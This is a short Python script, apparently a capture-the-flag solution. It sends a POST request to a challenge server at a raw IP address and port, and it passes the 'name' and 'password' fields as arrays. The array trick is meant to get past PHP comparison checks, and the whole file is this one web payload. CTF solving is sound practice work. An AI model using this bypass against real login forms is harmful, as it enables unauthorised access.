import httpx

resp = httpx.post('http://129.204.78.34:20378/', params={
    'name[]': 'HNU',
}, data={
    'password[]': 'CTF',
})

print(resp.text)
